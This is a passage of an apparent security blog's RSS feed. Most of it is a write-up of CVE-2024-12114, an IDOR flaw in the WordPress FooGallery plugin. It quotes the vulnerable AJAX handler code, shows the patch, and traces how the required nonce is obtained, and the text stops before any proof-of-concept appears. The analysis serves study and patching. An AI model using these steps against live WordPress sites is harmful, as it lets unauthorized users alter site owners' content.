width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;IDOR occurs due to missing resource ownership validation.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_nopriv&lt;/code&gt; is a dangerous attack surface without additional authentication.&lt;/li&gt;&#xA;&lt;li&gt;Never trust user input such as &lt;code&gt;listing_id&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Always combine &lt;strong&gt;authentication + authorization&lt;/strong&gt; when handling AJAX endpoints.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/business-directory-plugin/vulnerability/wordpress-business-directory-plugin-plugin-6-4-14-insecure-direct-object-reference-to-listing-arbitrary-image-addition-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Business Directory Plugin &amp;lt;= 6.4.14 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2024-12114 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-12-30-cve-2024-12114/</link>
      <pubDate>Tue, 30 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-30-cve-2024-12114/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;FooGallery – Responsive Photo Gallery, Image Viewer, Justified, Masonry &amp;amp; Carousel&lt;/strong&gt; plugin for &lt;strong&gt;WordPress&lt;/strong&gt; contains an &lt;strong&gt;Insecure Direct Object Reference&lt;/strong&gt; vulnerability in &lt;strong&gt;all versions up to and including 2.4.29&lt;/strong&gt; via the AJAX action &lt;strong&gt;&lt;code&gt;foogallery_attachment_modal_save&lt;/code&gt;&lt;/strong&gt;, due to &lt;strong&gt;missing authorization checks&lt;/strong&gt; on a user-controlled key (&lt;strong&gt;&lt;code&gt;img_id&lt;/code&gt;&lt;/strong&gt;).&#xA;This allows an &lt;strong&gt;authenticated attacker&lt;/strong&gt;, with &lt;strong&gt;granted access or higher&lt;/strong&gt;, to &lt;strong&gt;update the content of any post or page&lt;/strong&gt;.&#xA;The actual impact only occurs when the &lt;strong&gt;Gallery Creator role setting&lt;/strong&gt; is set &lt;strong&gt;lower than “Editor”&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2024-12114&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2024-12114&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure Direct Object References (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.4.29&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.4.30&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (4.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: N/A&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/foogallery/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress FooGallery Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;FooGallery&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.4.29&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;2.4.30&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Info&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;According to the CVE description, the actual impact only occurs when the &lt;strong&gt;Gallery Creator role setting&lt;/strong&gt; is set &lt;strong&gt;lower than “Editor”&lt;/strong&gt;.&#xA;You can configure it here:&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/role.png&#34; title=&#34;Gallery Creator role&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/role.png&#34; data-sub-html=&#34;&lt;h2&gt;Role&lt;/h2&gt;&lt;p&gt;Gallery Creator role&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/role.png&#39; alt=&#34;Role&#34; height=&#34;882&#34; width=&#34;1382&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Gallery Creator role&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&#xA;At that point, users with this role will be able to use the &lt;strong&gt;Add&lt;/strong&gt;/&lt;strong&gt;Edit&lt;/strong&gt; Gallery functionality:&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/create.png&#34; title=&#34;Create/Add&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/create.png&#34; data-sub-html=&#34;&lt;h2&gt;Create/Add&lt;/h2&gt;&lt;p&gt;Create/Add&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/create.png&#39; alt=&#34;Create/Add&#34; height=&#34;829&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Create/Add&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers an AJAX handler &lt;strong&gt;for logged-in users&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_foogallery_attachment_modal_save&amp;#39;, array( $this, &amp;#39;ajax_save_modal&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_ajax_&lt;/code&gt; is a hook for authenticated users (Subscriber+). When a request is sent to &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; with the parameter &lt;code&gt;action=foogallery_attachment_modal_save&lt;/code&gt;, the callback &lt;code&gt;ajax_save_modal&lt;/code&gt; is executed:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function ajax_save_modal() {&#xA;    $foogallery = ( isset( $_POST[&amp;#39;foogallery&amp;#39;] ) ? $_POST[&amp;#39;foogallery&amp;#39;] : array() );&#xA;&#xA;    if ( !is_array( $foogallery ) || empty( $foogallery ) ) {&#xA;        return;&#xA;    }&#xA;&#xA;    // Check for nonce security      &#xA;    if ( ! wp_verify_nonce( $_POST[&amp;#39;nonce&amp;#39;], &amp;#39;foogallery-modal-nonce&amp;#39; ) ) {&#xA;        die ( &amp;#39;Busted!&amp;#39;);&#xA;    }&#xA;&#xA;    $img_id = intval( sanitize_text_field( $_POST[&amp;#39;img_id&amp;#39;] ) );&#xA;&#xA;    if ( $img_id &amp;gt; 0 ) {&#xA;        do_action( &amp;#39;foogallery_attachment_save_data&amp;#39;, $img_id, $foogallery );&#xA;    }&#xA;    &#xA;    wp_die();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The function retrieves &lt;code&gt;foogallery&lt;/code&gt; from the request, checks whether it is a valid non-empty array, then verifies the nonce to ensure the request is valid:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! wp_verify_nonce( $_POST[&amp;#39;nonce&amp;#39;], &amp;#39;foogallery-modal-nonce&amp;#39; ) ) {&#xA;    die ( &amp;#39;Busted!&amp;#39;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The function &lt;code&gt;wp_verify_nonce()&lt;/code&gt; verifies whether the submitted &lt;code&gt;nonce&lt;/code&gt; is valid (generated by the &lt;code&gt;foogallery-modal-nonce&lt;/code&gt; action).&lt;/p&gt;&#xA;&lt;p&gt;If valid and &lt;code&gt;img_id &amp;gt; 0&lt;/code&gt;, &lt;code&gt;do_action(&#39;foogallery_attachment_save_data&#39;, ...)&lt;/code&gt; is executed with the provided &lt;code&gt;img_id&lt;/code&gt; and &lt;code&gt;foogallery&lt;/code&gt; data.&lt;/p&gt;&#xA;&lt;p&gt;Previously, the plugin registered a series of callbacks for the &lt;code&gt;foogallery_attachment_save_data&lt;/code&gt; action:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/add_action.png&#34; title=&#34;Registered callbacks for action foogallery_attachment_save_data&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/add_action.png&#34; data-sub-html=&#34;&lt;h2&gt;Add action&lt;/h2&gt;&lt;p&gt;Registered callbacks for action foogallery_attachment_save_data&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/add_action.png&#39; alt=&#34;Add action&#34; height=&#34;521&#34; width=&#34;1913&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Registered callbacks for action foogallery_attachment_save_data&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function foogallery_attachment_save_data_main( $img_id, $data ) {&#xA;&#xA;    if ( is_array( $data ) &amp;amp;&amp;amp; !empty( $data ) ) {&#xA;&#xA;        $foogallery_post = array(&#xA;            &amp;#39;ID&amp;#39; =&amp;gt; $img_id&#xA;        );&#xA;&#xA;        if ( array_key_exists( &amp;#39;title&amp;#39;, $data ) ) {&#xA;            $foogallery_post[&amp;#39;post_title&amp;#39;] = $data[&amp;#39;title&amp;#39;];&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;caption&amp;#39;, $data ) ) {&#xA;            $foogallery_post[&amp;#39;post_excerpt&amp;#39;] = $data[&amp;#39;caption&amp;#39;];&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;description&amp;#39;, $data ) ) {&#xA;            $foogallery_post[&amp;#39;post_content&amp;#39;] = $data[&amp;#39;description&amp;#39;];&#xA;        }&#xA;&#xA;        // Update post meta values&#xA;        if ( array_key_exists( &amp;#39;alt-text&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;_wp_attachment_image_alt&amp;#39;, $data[&amp;#39;alt-text&amp;#39;] );&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;custom-url&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;_foogallery_custom_url&amp;#39;, $data[&amp;#39;custom-url&amp;#39;] );&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;custom-target&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;_foogallery_custom_target&amp;#39;, $data[&amp;#39;custom-target&amp;#39;] );&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;custom-class&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;_foogallery_custom_class&amp;#39;, $data[&amp;#39;custom-class&amp;#39;] );&#xA;        }&#xA;&#xA;        if ( is_array( $foogallery_post ) &amp;amp;&amp;amp; count( $foogallery_post ) &amp;gt; 1 ) {&#xA;            // Update the post into the database&#xA;            wp_update_post( $foogallery_post );&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;public function foogallery_attachment_save_data_taxonomies( $img_id, $data ) {&#xA;    if ( is_array( $data ) &amp;amp;&amp;amp; !empty( $data ) ) {&#xA;&#xA;        if ( !$this-&amp;gt;attachments_have_taxonomies() ) {&#xA;            return;&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;taxonomies&amp;#39;, $data ) ) {&#xA;            foreach ( $data[&amp;#39;taxonomies&amp;#39;] as $taxonomy =&amp;gt; $taxonomy_value ) {&#xA;                $terms = explode( &amp;#39;,&amp;#39;, $taxonomy_value );&#xA;                if ( is_array( $terms ) ) {&#xA;                    $terms = array_map( &amp;#39;intval&amp;#39;, $terms );&#xA;                    wp_set_object_terms( $img_id, $terms, $taxonomy, false );&#xA;                }&#xA;            }&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;public function foogallery_attachment_save_data_thumbnails( $img_id, $data ) {&#xA;    if ( is_array( $data ) &amp;amp;&amp;amp; !empty( $data ) ) {&#xA;&#xA;        if ( array_key_exists( &amp;#39;crop_pos&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;foogallery_crop_pos&amp;#39;, $data[&amp;#39;crop_pos&amp;#39;] );&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;override-thumbnail-id&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;foogallery_override_thumbnail&amp;#39;, $data[&amp;#39;override-thumbnail-id&amp;#39;] );&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;public function foogallery_attachment_save_data_advanced($img_id, $data ) {&#xA;    if ( is_array( $data ) &amp;amp;&amp;amp; !empty( $data ) ) {&#xA;        if ( array_key_exists( &amp;#39;data-width&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;_data-width&amp;#39;, $data[&amp;#39;data-width&amp;#39;] );&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;data-height&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;_data-height&amp;#39;, $data[&amp;#39;data-height&amp;#39;] );&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;panning&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;_foobox_panning&amp;#39;, $data[&amp;#39;panning&amp;#39;] );&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;override_type&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;_foogallery_override_type&amp;#39;, $data[&amp;#39;override_type&amp;#39;] );&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;These callbacks perform a series of updates on the gallery corresponding to &lt;code&gt;img_id&lt;/code&gt;, with data fully controlled by the attacker.&lt;/p&gt;&#xA;&lt;p&gt;The IDOR vulnerability occurs because there is no restriction on the gallery corresponding to &lt;code&gt;img_id&lt;/code&gt;, allowing an attacker to arbitrarily modify galleries they do not own.&lt;/p&gt;&#xA;&lt;p&gt;The patch in &lt;code&gt;v2.4.30&lt;/code&gt; added the following restriction:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( current_user_can(&amp;#39;edit_post&amp;#39;, $img_id ) ) {&#xA;    do_action( &amp;#39;foogallery_attachment_save_data&amp;#39;, $img_id, $foogallery );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/patch.png&#34; title=&#34;Patch&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/patch.png&#34; data-sub-html=&#34;&lt;h2&gt;Patch&lt;/h2&gt;&lt;p&gt;Patch&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/patch.png&#39; alt=&#34;Patch&#34; height=&#34;470&#34; width=&#34;1814&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Patch&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Only users with the &lt;code&gt;edit_post&lt;/code&gt; capability for the given &lt;code&gt;$img_id&lt;/code&gt; are allowed to trigger the &lt;code&gt;foogallery_attachment_save_data&lt;/code&gt; action to modify it.&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;A prerequisite is obtaining the nonce value corresponding to the &lt;code&gt;foogallery-modal-nonce&lt;/code&gt; action.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/create_nonce.png&#34; title=&#34;Generating nonce with action foogallery-modal-nonce&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/create_nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Create nonce&lt;/h2&gt;&lt;p&gt;Generating nonce with action foogallery-modal-nonce&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/create_nonce.png&#39; alt=&#34;Create nonce&#34; height=&#34;464&#34; width=&#34;1730&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Generating nonce with action foogallery-modal-nonce&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;The nonce is generated in the &lt;code&gt;build_modal_data()&lt;/code&gt; function via &lt;code&gt;wp_create_nonce( &#39;foogallery-modal-nonce&#39; )&lt;/code&gt; and only if two conditions are met:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;$data&lt;/code&gt; is an array&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;img_id&lt;/code&gt; and &lt;code&gt;gallery_id&lt;/code&gt; are not &lt;code&gt;null&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;The &lt;code&gt;build_modal_data&lt;/code&gt; function returns an array that includes the &lt;code&gt;nonce&lt;/code&gt; value.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/embed_nonce.png&#34; title=&#34;Nonce value embedded into HTML&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/embed_nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Embed nonce&lt;/h2&gt;&lt;p&gt;Nonce value embedded into HTML&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/embed_nonce.png&#39; alt=&#34;Embed nonce&#34; height=&#34;961&#34; width=&#34;1372&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce value embedded into HTML&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;This value is used by the &lt;code&gt;ajax_open_modal&lt;/code&gt; function, where the &lt;code&gt;nonce&lt;/code&gt; is embedded into the HTML form with ID &lt;code&gt;foogallery_attachment_modal_save_form&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Before that, &lt;code&gt;ajax_open_modal&lt;/code&gt; validates the nonce corresponding to the &lt;code&gt;foogallery_attachment_modal_open&lt;/code&gt; action:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! wp_verify_nonce( $_POST[&amp;#39;nonce&amp;#39;], &amp;#39;foogallery_attachment_modal_open&amp;#39; ) ) {&#xA;    die ( &amp;#39;Busted!&amp;#39;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/create_nonce1.png&#34; title=&#34;Generate nonce with action foogallery_attachment_modal_open&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/create_nonce1.png&#34; data-sub-html=&#34;&lt;h2&gt;Create nonce&lt;/h2&gt;&lt;p&gt;Generate nonce with action foogallery_attachment_modal_open&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/create_nonce1.png&#39; alt=&#34;Create nonce&#34; height=&#34;1067&#34; width=&#34;1918&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Generate nonce with action foogallery_attachment_modal_open&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;By reviewing the function logic, we see that the 